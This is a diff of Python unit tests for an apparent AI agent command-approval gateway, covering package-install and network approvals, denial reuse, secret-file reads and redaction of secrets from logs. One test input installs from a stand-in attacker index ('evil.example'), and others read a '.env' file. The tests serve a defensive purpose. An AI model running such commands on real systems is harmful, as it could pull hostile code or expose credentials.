@@ -135,7 +135,7 @@ class BrowserGatewayConfigTests(unittest.TestCase):
         self.assertEqual(ex.decide('bash', [install], {'command': install}, wd, autonomy=False,
                                    ask=Mock(side_effect=AssertionError('must reuse denial')),
                                    task_scope=second), ('reject', 'user_denied'))
-        allowed = 'pip install rich'
+        allowed = 'npm install rich'
         self.assertEqual(ex.decide('bash', [allowed], {'command': allowed}, wd, autonomy=False,
                                    ask=lambda _p: 'y', task_scope=second)[0], 'once')
         third = ex.TaskScope(wd, approval_data=persisted, save_approval=save)
@@ -239,17 +239,46 @@ class BrowserGatewayConfigTests(unittest.TestCase):
         self.assertEqual(len(asked), 1)
         self.assertEqual(ex.decide('bash', ['pip install rich'], {'command': 'pip install rich'}, wd,
                                    autonomy=False, ask=ask, task_scope=scope)[0], 'once')
-        self.assertEqual(len(asked), 2, 'a second package needs its own approval')
+        self.assertEqual(len(asked), 1, 'one Python install approval covers every pip spelling and package')
+        for other in ('pip3 install --user rich', 'python3 -m pip install rich', 'pip install --break-system-packages x'):
+            self.assertEqual(ex.decide('bash', [other], {'command': other}, wd, autonomy=False,
+                                       ask=lambda _p: self.fail('same ecosystem must reuse its approval'),
+                                       task_scope=scope)[0], 'once')
+        npm = 'npm install left-pad'
+        self.assertEqual(ex.decide('bash', [npm], {'command': npm}, wd, autonomy=False, ask=ask,
+                                   task_scope=scope)[0], 'once')
+        self.assertEqual(len(asked), 2, 'another ecosystem asks separately')
+        odd = 'pip install --index-url https://evil.example/simple x'
+        self.assertEqual(ex.decide('bash', [odd], {'command': odd}, wd, autonomy=False, ask=ask,
+                                   task_scope=scope)[0], 'once')
+        self.assertEqual(len(asked), 3, 'a new host beyond the registries asks again')
         denied_scope = ex.TaskScope(wd)
         denied = Mock(return_value='n')
         self.assertEqual(ex.decide('bash', [command], {'command': command}, wd, autonomy=False,
                                    ask=denied, task_scope=denied_scope)[0], 'reject')
-        self.assertEqual(ex.decide('bash', ['pip install rich'], {'command': 'pip install rich'}, wd,
-                                   autonomy=False, ask=denied, task_scope=denied_scope)[0], 'reject')
-        self.assertEqual(denied.call_count, 2)
+        self.assertEqual(ex.decide('bash', ['python3 -m pip install rich'], {'command': 'python3 -m pip install rich'},
+                                   wd, autonomy=False,
+                                   ask=lambda _p: self.fail('denied ecosystem must not reprompt'),
+                                   task_scope=denied_scope)[0], 'reject')
+        self.assertEqual(denied.call_count, 1)
         self.assertEqual(ex.decide('bash', [command], {'command': command}, wd, autonomy=False,
                                    ask=lambda _prompt: self.fail('denied package must not reprompt'),
                                    task_scope=denied_scope)[0], 'reject')
+
+    def test_approved_secret_read_reveals_the_file_and_a_refused_one_does_not(self):
+        wd = Path('/data/peter/workbench')
+        shown = []
+        self.assertEqual(ex.decide('read', ['/work/.env'], {}, wd, autonomy=False, ask=lambda _p: 'y',
+                                   reveal=shown.append)[0], 'once')
+        self.assertEqual(shown, [['/work/.env']])
+        self.assertEqual(ex.decide('read', ['/work/.env'], {}, wd, autonomy=False, ask=lambda _p: 'n',
+                                   reveal=shown.append)[0], 'reject')
+        self.assertEqual(len(shown), 1)
+
+    def test_revealed_secret_values_are_removed_from_the_saved_run_log(self):
+        body = ex._redact_secrets('{"out": "TOKEN=fake-abc123 and fake-abc123"}', ['TOKEN=fake-abc123' + chr(10) + 'A=1'])
+        self.assertNotIn('fake-abc123', body)
+        self.assertIn('[redacted]', body)
 
     def test_different_requirement_files_and_network_methods_need_separate_approval(self):
         wd = Path('/data/peter/workbench')
@@ -259,7 +288,7 @@ class BrowserGatewayConfigTests(unittest.TestCase):
                         'curl https://example.com/data', 'curl -X POST https://example.com/data'):
             self.assertEqual(ex.decide('bash', [command], {'command': command}, wd,
                                        autonomy=False, ask=ask, task_scope=scope)[0], 'once')
-        self.assertEqual(ask.call_count, 4)
+        self.assertEqual(ask.call_count, 3, 'pip installs share one card; each network method has its own')
 
 
 
